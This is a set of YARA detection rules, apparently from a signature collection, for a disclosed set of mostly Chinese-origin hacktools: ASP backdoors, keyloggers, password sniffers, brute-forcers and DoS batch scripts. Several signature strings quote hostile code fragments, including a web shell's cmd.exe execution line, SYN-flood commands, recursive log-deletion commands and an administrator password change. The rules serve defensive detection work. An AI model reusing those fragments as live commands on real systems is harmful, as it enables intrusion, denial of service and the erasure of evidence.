  "Hacktools_CN_JoHor_Posts_Killer": "rule Hacktools_CN_JoHor_Posts_Killer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file JoHor_Posts_Killer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"d157f9a76f9d72dba020887d7b861a05f2e56b6a\"\n\tstrings:\n\t\t$s0 = \"Multithreading Posts_Send Killer\" fullword ascii\n\t\t$s3 = \"GET [Access Point] HTTP/1.1\" fullword ascii\n\t\t$s6 = \"The program's need files was not exist!\" fullword ascii\n\t\t$s7 = \"JoHor_Posts_Killer\" fullword wide\n\t\t$s8 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\" fullword ascii\n\t\t$s10 = \"  ( /s ) :\" fullword ascii\n\t\t$s11 = \"forms.vbp\" fullword ascii\n\t\t$s12 = \"forms.vcp\" fullword ascii\n\t\t$s13 = \"Software\\\\FlySky\\\\E\\\\Install\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "Hacktools_CN_Panda_tesksd": "rule Hacktools_CN_Panda_tesksd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tesksd.jpg\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"922147b3e1e6cf1f5dd5f64a4e34d28bdc9128cb\"\n\tstrings:\n\t\t$s0 = \"name=\\\"Microsoft.Windows.Common-Controls\\\" \" fullword ascii\n\t\t$s1 = \"ExeMiniDownload.exe\" fullword wide\n\t\t$s16 = \"POST %Hs\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_Http": "rule Hacktools_CN_Http {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Http.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"788bf0fdb2f15e0c628da7056b4e7b1a66340338\"\n\tstrings:\n\t\t$s0 = \"RPCRT4.DLL\" fullword ascii\n\t\t$s1 = \"WNetAddConnection2A\" fullword ascii\n\t\t$s2 = \"NdrPointerBufferSize\" fullword ascii\n\t\t$s3 = \"_controlfp\" fullword ascii\n\tcondition:\n\t\tall of them and filesize < 10KB\n}",
  "Hacktools_CN_Burst_Start": "rule Hacktools_CN_Burst_Start {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Start.bat - DoS tool\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"75d194d53ccc37a68286d246f2a84af6b070e30c\"\n\tstrings:\n\t\t$s0 = \"for /f \\\"eol= tokens=1,2 delims= \\\" %%i in (ip.txt) do (\" fullword ascii\n\t\t$s1 = \"Blast.bat /r 600\" fullword ascii\n\t\t$s2 = \"Blast.bat /l Blast.bat\" fullword ascii\n\t\t$s3 = \"Blast.bat /c 600\" fullword ascii\n\t\t$s4 = \"start Clear.bat\" fullword ascii\n\t\t$s5 = \"del Result.txt\" fullword ascii\n\t\t$s6 = \"s syn %%i %%j 3306 /save\" fullword ascii\n\t\t$s7 = \"start Thecard.bat\" fullword ascii\n\t\t$s10 = \"setlocal enabledelayedexpansion\" fullword ascii\n\tcondition:\n\t\t5 of them\n}",
  "Hacktools_CN_Panda_tasksvr": "rule Hacktools_CN_Panda_tasksvr {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file tasksvr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"a73fc74086c8bb583b1e3dcfd326e7a383007dc0\"\n\tstrings:\n\t\t$s2 = \"Consys21.dll\" fullword ascii\n\t\t$s4 = \"360EntCall.exe\" fullword wide\n\t\t$s15 = \"Beijing1\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_Burst_Clear": "rule Hacktools_CN_Burst_Clear {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Clear.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"148c574a4e6e661aeadaf3a4c9eafa92a00b68e4\"\n\tstrings:\n\t\t$s0 = \"del /f /s /q %systemdrive%\\\\*.log    \" fullword ascii\n\t\t$s1 = \"del /f /s /q %windir%\\\\*.bak    \" fullword ascii\n\t\t$s4 = \"del /f /s /q %systemdrive%\\\\*.chk    \" fullword ascii\n\t\t$s5 = \"del /f /s /q %systemdrive%\\\\*.tmp    \" fullword ascii\n\t\t$s8 = \"del /f /q %userprofile%\\\\COOKIES s\\\\*.*    \" fullword ascii\n\t\t$s9 = \"rd /s /q %windir%\\\\temp & md %windir%\\\\temp    \" fullword ascii\n\t\t$s11 = \"del /f /s /q %systemdrive%\\\\recycled\\\\*.*    \" fullword ascii\n\t\t$s12 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temp\\\\*.*\\\"    \" fullword ascii\n\t\t$s19 = \"del /f /s /q \\\"%userprofile%\\\\Local Settings\\\\Temporary Internet Files\\\\*.*\\\"   \" ascii\n\tcondition:\n\t\t5 of them\n}",
  "Hacktools_CN_Burst_Thecard": "rule Hacktools_CN_Burst_Thecard {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Thecard.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"50b01ea0bfa5ded855b19b024d39a3d632bacb4c\"\n\tstrings:\n\t\t$s0 = \"tasklist |find \\\"Clear.bat\\\"||start Clear.bat\" fullword ascii\n\t\t$s1 = \"Http://www.coffeewl.com\" fullword ascii\n\t\t$s2 = \"ping -n 2 localhost 1>nul 2>nul\" fullword ascii\n\t\t$s3 = \"for /L %%a in (\" fullword ascii\n\t\t$s4 = \"MODE con: COLS=42 lines=5\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "Hacktools_CN_Burst_Blast": "rule Hacktools_CN_Burst_Blast {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set - file Blast.bat\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"17.11.14\"\n\t\tscore = 60\n\t\thash = \"b07702a381fa2eaee40b96ae2443918209674051\"\n\tstrings:\n\t\t$s0 = \"@sql.exe -f ip.txt -m syn -t 3306 -c 5000 -u http:\" ascii\n\t\t$s1 = \"@echo off\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "VUBrute_VUBrute": "rule VUBrute_VUBrute {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\thash = \"166fa8c5a0ebb216c832ab61bf8872da556576a7\"\n\tstrings:\n\t\t$s0 = \"Text Files (*.txt);;All Files (*)\" fullword ascii\n\t\t$s1 = \"http://ubrute.com\" fullword ascii\n\t\t$s11 = \"IP - %d; Password - %d; Combination - %d\" fullword ascii\n\t\t$s14 = \"error.txt\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "DK_Brute": "rule DK_Brute {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\treference = \"http://goo.gl/xiIphp\"\n\t\thash = \"93b7c3a01c41baecfbe42461cb455265f33fbc3d\"\n\tstrings:\n\t\t$s6 = \"get_CrackedCredentials\" fullword ascii\n\t\t$s13 = \"Same port used for two different protocols:\" fullword wide\n\t\t$s18 = \"coded by fLaSh\" fullword ascii\n\t\t$s19 = \"get_grbToolsScaningCracking\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "VUBrute_config": "rule VUBrute_config {\n\tmeta:\n\t\tdescription = \"PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"22.11.14\"\n\t\tscore = 70\n\t\treference = \"http://goo.gl/xiIphp\"\n\t\thash = \"b9f66b9265d2370dab887604921167c11f7d93e9\"\n\tstrings:\n\t\t$s2 = \"Restore=1\" fullword ascii\n\t\t$s6 = \"Thread=\" ascii\n\t\t$s7 = \"Running=1\" fullword ascii\n\t\t$s8 = \"CheckCombination=\" fullword ascii\n\t\t$s10 = \"AutoSave=1.000000\" fullword ascii\n\t\t$s12 = \"TryConnect=\" ascii\n\t\t$s13 = \"Tray=\" ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_hunt": "rule sig_238_hunt {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file hunt.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"f9f059380d95c7f8d26152b1cb361d93492077ca\"\n\tstrings:\n\t\t$s1 = \"Programming by JD Glaser - All Rights Reserved\" fullword ascii\n\t\t$s3 = \"Usage - hunt \\\\\\\\servername\" fullword ascii\n\t\t$s4 = \".share = %S - %S\" fullword wide\n\t\t$s5 = \"SMB share enumerator and admin finder \" fullword ascii\n\t\t$s7 = \"Hunt only runs on Windows NT...\" fullword ascii\n\t\t$s8 = \"User = %S\" fullword ascii\n\t\t$s9 = \"Admin is %s\\\\%s\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_listip": "rule sig_238_listip {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file listip.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"f32a0c5bf787c10eb494eb3b83d0c7a035e7172b\"\n\tstrings:\n\t\t$s0 = \"ERROR!!! Bad host lookup. Program Terminate.\" fullword ascii\n\t\t$s2 = \"ERROR No.2!!! Program Terminate.\" fullword ascii\n\t\t$s4 = \"Local Host Name: %s\" fullword ascii\n\t\t$s5 = \"Packed by exe32pack 1.38\" fullword ascii\n\t\t$s7 = \"Local Computer Name: %s\" fullword ascii\n\t\t$s8 = \"Local IP Adress: %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "ArtTrayHookDll": "rule ArtTrayHookDll {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ArtTrayHookDll.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"4867214a3d96095d14aa8575f0adbb81a9381e6c\"\n\tstrings:\n\t\t$s0 = \"ArtTrayHookDll.dll\" fullword ascii\n\t\t$s7 = \"?TerminateHook@@YAXXZ\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_eee": "rule sig_238_eee {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file eee.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"236916ce2980c359ff1d5001af6dacb99227d9cb\"\n\tstrings:\n\t\t$s0 = \"szj1230@yesky.com\" fullword wide\n\t\t$s3 = \"C:\\\\Program Files\\\\DevStudio\\\\VB\\\\VB5.OLB\" fullword ascii\n\t\t$s4 = \"MailTo:szj1230@yesky.com\" fullword wide\n\t\t$s5 = \"Command1_Click\" fullword ascii\n\t\t$s7 = \"software\\\\microsoft\\\\internet explorer\\\\typedurls\" fullword wide\n\t\t$s11 = \"vb5chs.dll\" fullword ascii\n\t\t$s12 = \"MSVBVM50.DLL\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "aspbackdoor_asp4": "rule aspbackdoor_asp4 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp4.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"faf991664fd82a8755feb65334e5130f791baa8c\"\n\tstrings:\n\t\t$s0 = \"system.dll\" fullword ascii\n\t\t$s2 = \"set sys=server.CreateObject (\\\"system.contral\\\") \" fullword ascii\n\t\t$s3 = \"Public Function reboot(atype As Variant)\" fullword ascii\n\t\t$s4 = \"t& = ExitWindowsEx(1, atype)\" ascii\n\t\t$s5 = \"atype=request(\\\"atype\\\") \" fullword ascii\n\t\t$s7 = \"AceiveX dll\" fullword ascii\n\t\t$s8 = \"Declare Function ExitWindowsEx Lib \\\"user32\\\" (ByVal uFlags As Long, ByVal \" ascii\n\t\t$s10 = \"sys.reboot(atype)\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "aspfile1": "rule aspfile1 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file aspfile1.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"77b1e3a6e8f67bd6d16b7ace73dca383725ac0af\"\n\tstrings:\n\t\t$s0 = \"' -- check for a command that we have posted -- '\" fullword ascii\n\t\t$s1 = \"szTempFile = \\\"C:\\\\\\\" & oFileSys.GetTempName( )\" fullword ascii\n\t\t$s5 = \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=gb2312\\\"><BODY>\" fullword ascii\n\t\t$s6 = \"<input type=text name=\\\".CMD\\\" size=45 value=\\\"<%= szCMD %>\\\">\" fullword ascii\n\t\t$s8 = \"Call oScript.Run (\\\"cmd.exe /c \\\" & szCMD & \\\" > \\\" & szTempFile, 0, True)\" fullword ascii\n\t\t$s15 = \"szCMD = Request.Form(\\\".CMD\\\")\" fullword ascii\n\tcondition:\n\t\t3 of them\n}",
  "EditServer_HackTool": "rule EditServer_HackTool {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditServer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"87b29c9121cac6ae780237f7e04ee3bc1a9777d3\"\n\tstrings:\n\t\t$s0 = \"%s Server.exe\" fullword ascii\n\t\t$s1 = \"Service Port: %s\" fullword ascii\n\t\t$s2 = \"The Port Must Been >0 & <65535\" fullword ascii\n\t\t$s8 = \"3--Set Server Port\" fullword ascii\n\t\t$s9 = \"The Server Password Exceeds 32 Characters\" fullword ascii\n\t\t$s13 = \"Service Name: %s\" fullword ascii\n\t\t$s14 = \"Server Password: %s\" fullword ascii\n\t\t$s17 = \"Inject Process Name: %s\" fullword ascii\n\n\t\t$x1 = \"WinEggDrop Shell Congirator\" fullword ascii\n\tcondition:\n\t\t5 of ($s*) or $x1\n}",
  "sig_238_letmein": "rule sig_238_letmein {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file letmein.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"74d223a56f97b223a640e4139bb9b94d8faa895d\"\n\tstrings:\n\t\t$s1 = \"Error get globalgroup memebers: NERR_InvalidComputer\" fullword ascii\n\t\t$s6 = \"Error get users from server!\" fullword ascii\n\t\t$s7 = \"get in nt by name and null\" fullword ascii\n\t\t$s16 = \"get something from nt, hold by killusa.\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_token": "rule sig_238_token {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file token.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"c52bc6543d4281aa75a3e6e2da33cfb4b7c34b14\"\n\tstrings:\n\t\t$s0 = \"Logon.exe\" fullword ascii\n\t\t$s1 = \"Domain And User:\" fullword ascii\n\t\t$s2 = \"PID=Get Addr$(): One\" fullword ascii\n\t\t$s3 = \"Process \" fullword ascii\n\t\t$s4 = \"psapi.dllK\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_TELNET": "rule sig_238_TELNET {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file TELNET.EXE from Windows ME\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"50d02d77dc6cc4dc2674f90762a2622e861d79b1\"\n\tstrings:\n\t\t$s0 = \"TELNET [host [port]]\" fullword wide\n\t\t$s2 = \"TELNET.EXE\" fullword wide\n\t\t$s4 = \"Microsoft(R) Windows(R) Millennium Operating System\" fullword wide\n\t\t$s14 = \"Software\\\\Microsoft\\\\Telnet\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "snifferport": "rule snifferport {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file snifferport.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d14133b5eaced9b7039048d0767c544419473144\"\n\tstrings:\n\t\t$s0 = \"iphlpapi.DLL\" fullword ascii\n\t\t$s5 = \"ystem\\\\CurrentCorolSet\\\\\" fullword ascii\n\t\t$s11 = \"Port.TX\" fullword ascii\n\t\t$s12 = \"32Next\" fullword ascii\n\t\t$s13 = \"V1.2 B\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_webget": "rule sig_238_webget {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file webget.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"36b5a5dee093aa846f906bbecf872a4e66989e42\"\n\tstrings:\n\t\t$s0 = \"Packed by exe32pack\" ascii\n\t\t$s1 = \"GET A HTTP/1.0\" fullword ascii\n\t\t$s2 = \" error \" fullword ascii\n\t\t$s13 = \"Downloa\" ascii\n\tcondition:\n\t\tall of them\n}",
  "XYZCmd_zip_Folder_XYZCmd": "rule XYZCmd_zip_Folder_XYZCmd {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file XYZCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"bbea5a94950b0e8aab4a12ad80e09b630dd98115\"\n\tstrings:\n\t\t$s0 = \"Executes Command Remotely\" fullword wide\n\t\t$s2 = \"XYZCmd.exe\" fullword wide\n\t\t$s6 = \"No Client Software\" fullword wide\n\t\t$s19 = \"XYZCmd V1.0 For NT S\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "ASPack_Chinese": "rule ASPack_Chinese {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file ASPack Chinese.ini\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"02a9394bc2ec385876c4b4f61d72471ac8251a8e\"\n\tstrings:\n\t\t$s0 = \"= Click here if you want to get your registered copy of ASPack\" fullword ascii\n\t\t$s1 = \";  For beginning of translate - copy english.ini into the yourlanguage.ini\" fullword ascii\n\t\t$s2 = \"E-Mail:                      shinlan@km169.net\" fullword ascii\n\t\t$s8 = \";  Please, translate text only after simbol '='\" fullword ascii\n\t\t$s19 = \"= Compress with ASPack\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "aspbackdoor_EDIR": "rule aspbackdoor_EDIR {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EDIR.ASP\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"03367ad891b1580cfc864e8a03850368cbf3e0bb\"\n\tstrings:\n\t\t$s1 = \"response.write \\\"<a href='index.asp'>\" fullword ascii\n\t\t$s3 = \"if Request.Cookies(\\\"password\\\")=\\\"\" ascii\n\t\t$s6 = \"whichdir=server.mappath(Request(\\\"path\\\"))\" fullword ascii\n\t\t$s7 = \"Set fs = CreateObject(\\\"Scripting.FileSystemObject\\\")\" fullword ascii\n\t\t$s19 = \"whichdir=Request(\\\"path\\\")\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "sig_238_filespy": "rule sig_238_filespy {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file filespy.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 50\n\t\thash = \"89d8490039778f8c5f07aa7fd476170293d24d26\"\n\tstrings:\n\t\t$s0 = \"Hit [Enter] to begin command mode...\" fullword ascii\n\t\t$s1 = \"If you are in command mode,\" fullword ascii\n\t\t$s2 = \"[/l] lists all the drives the monitor is currently attached to\" fullword ascii\n\t\t$s9 = \"FileSpy.exe\" fullword wide\n\t\t$s12 = \"ERROR starting FileSpy...\" fullword ascii\n\t\t$s16 = \"exe\\\\filespy.dbg\" fullword ascii\n\t\t$s17 = \"[/d <drive>] detaches monitor from <drive>\" fullword ascii\n\t\t$s19 = \"Should be logging to screen...\" fullword ascii\n\t\t$s20 = \"Filmon:  Unknown log record type\" fullword ascii\n\tcondition:\n\t\t7 of them\n}",
  "ByPassFireWall_zip_Folder_Ie": "rule ByPassFireWall_zip_Folder_Ie {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Ie.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"d1b9058f16399e182c9b78314ad18b975d882131\"\n\tstrings:\n\t\t$s0 = \"d:\\\\documents and settings\\\\loveengeng\\\\desktop\\\\source\\\\bypass\\\\lcc\\\\ie.dll\" fullword ascii\n\t\t$s1 = \"LOADER ERROR\" fullword ascii\n\t\t$s5 = \"The procedure entry point %s could not be located in the dynamic link library %s\" fullword ascii\n\t\t$s7 = \"The ordinal %u could not be located in the dynamic link library %s\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "EditKeyLogReadMe": "rule EditKeyLogReadMe {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditKeyLogReadMe.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"dfa90540b0e58346f4b6ea12e30c1404e15fbe5a\"\n\tstrings:\n\t\t$s0 = \"editKeyLog.exe KeyLog.exe,\" fullword ascii\n\t\t$s1 = \"WinEggDrop.DLL\" fullword ascii\n\t\t$s2 = \"nc.exe\" fullword ascii\n\t\t$s3 = \"KeyLog.exe\" fullword ascii\n\t\t$s4 = \"EditKeyLog.exe\" fullword ascii\n\t\t$s5 = \"wineggdrop\" fullword ascii\n\tcondition:\n\t\t3 of them\n}",
  "PassSniffer_zip_Folder_readme": "rule PassSniffer_zip_Folder_readme {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file readme.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a52545ae62ddb0ea52905cbb61d895a51bfe9bcd\"\n\tstrings:\n\t\t$s0 = \"PassSniffer.exe\" fullword ascii\n\t\t$s1 = \"POP3/FTP Sniffer\" fullword ascii\n\t\t$s2 = \"Password Sniffer V1.0\" fullword ascii\n\tcondition:\n\t\t1 of them\n}",
  "sig_238_gina": "rule sig_238_gina {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file gina.reg\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"324acc52566baf4afdb0f3e4aaf76e42899e0cf6\"\n\tstrings:\n\t\t$s0 = \"\\\"gina\\\"=\\\"gina.dll\\\"\" fullword ascii\n\t\t$s1 = \"REGEDIT4\" fullword ascii\n\t\t$s2 = \"[HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon]\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "splitjoin": "rule splitjoin {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file splitjoin.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"e4a9ef5d417038c4c76b72b5a636769a98bd2f8c\"\n\tstrings:\n\t\t$s0 = \"Not for distribution without the authors permission\" fullword wide\n\t\t$s2 = \"Utility to split and rejoin files.0\" fullword wide\n\t\t$s5 = \"Copyright (c) Angus Johnson 2001-2002\" fullword wide\n\t\t$s19 = \"SplitJoin\" fullword wide\n\tcondition:\n\t\tall of them\n}",
  "EditKeyLog": "rule EditKeyLog {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file EditKeyLog.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"a450c31f13c23426b24624f53873e4fc3777dc6b\"\n\tstrings:\n\t\t$s1 = \"Press Any Ke\" fullword ascii\n\t\t$s2 = \"Enter 1 O\" fullword ascii\n\t\t$s3 = \"Bon >0 & <65535L\" fullword ascii\n\t\t$s4 = \"--Choose \" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "PassSniffer": "rule PassSniffer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file PassSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"dcce4c577728e8edf7ed38ac6ef6a1e68afb2c9f\"\n\tstrings:\n\t\t$s2 = \"Sniff\" fullword ascii\n\t\t$s3 = \"GetLas\" fullword ascii\n\t\t$s4 = \"VersionExA\" fullword ascii\n\t\t$s10 = \" Only RuntUZ\" fullword ascii\n\t\t$s12 = \"emcpysetprintf\\\\\" fullword ascii\n\t\t$s13 = \"WSFtartup\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "aspfile2": "rule aspfile2 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file aspfile2.asp\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"14efbc6cb01b809ad75a535d32b9da4df517ff29\"\n\tstrings:\n\t\t$s0 = \"response.write \\\"command completed success!\\\" \" fullword ascii\n\t\t$s1 = \"for each co in foditems \" fullword ascii\n\t\t$s3 = \"<input type=text name=text6 value=\\\"<%= szCMD6 %>\\\"><br> \" fullword ascii\n\t\t$s19 = \"<title>Hello! Welcome </title>\" fullword ascii\n\tcondition:\n\t\tall of them\n}",
  "UnPack_rar_Folder_InjectT": "rule UnPack_rar_Folder_InjectT {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file InjectT.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"80f39e77d4a34ecc6621ae0f4d5be7563ab27ea6\"\n\tstrings:\n\t\t$s0 = \"%s -Install                          -->To Install The Service\" fullword ascii\n\t\t$s1 = \"Explorer.exe\" fullword ascii\n\t\t$s2 = \"%s -Start                            -->To Start The Service\" fullword ascii\n\t\t$s3 = \"%s -Stop                             -->To Stop The Service\" fullword ascii\n\t\t$s4 = \"The Port Is Out Of Range\" fullword ascii\n\t\t$s7 = \"Fail To Set The Port\" fullword ascii\n\t\t$s11 = \"\\\\psapi.dll\" fullword ascii\n\t\t$s20 = \"TInject.Dll\" fullword ascii\n\n\t\t$x1 = \"Software\\\\Microsoft\\\\Internet Explorer\\\\WinEggDropShell\" fullword ascii\n\t\t$x2 = \"injectt.exe\" fullword ascii\n\tcondition:\n\t\t( 1 of ($x*) ) and ( 3 of ($s*) )\n}",
  "Jc_WinEggDrop_Shell": "rule Jc_WinEggDrop_Shell {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file Jc.WinEggDrop Shell.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"820674b59f32f2cf72df50ba4411d7132d863ad2\"\n\tstrings:\n\t\t$s0 = \"Sniffer.dll\" fullword ascii\n\t\t$s4 = \":Execute net.exe user Administrator pass\" fullword ascii\n\t\t$s5 = \"Fport.exe or mport.exe \" fullword ascii\n\t\t$s6 = \":Password Sniffering Is Running |Not Running \" fullword ascii\n\t\t$s9 = \": The Terminal Service Port Has Been Set To NewPort\" fullword ascii\n\t\t$s15 = \": Del www.exe                   \" fullword ascii\n\t\t$s20 = \":Dir *.exe                    \" fullword ascii\n\tcondition:\n\t\t2 of them\n}",
  "aspbackdoor_asp1": "rule aspbackdoor_asp1 {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - file asp1.txt\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\thash = \"9ef9f34392a673c64525fcd56449a9fb1d1f3c50\"\n\tstrings:\n\t\t$s0 = \"param = \\\"driver={Microsoft Access Driver (*.mdb)}\\\" \" fullword ascii\n\t\t$s1 = \"conn.Open param & \\\";dbq=\\\" & Server.MapPath(\\\"scjh.mdb\\\") \" fullword ascii\n\t\t$s6 = \"set rs=conn.execute (sql)%> \" fullword ascii\n\t\t$s7 = \"<%set Conn = Server.CreateObject(\\\"ADODB.Connection\\\") \" fullword ascii\n\t\t$s10 = \"<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh \" fullword ascii\n\t\t$s15 = \"sql=\\\"select * from scjh\\\" \" fullword ascii\n\tcondition:\n\t\tall of them\n}",
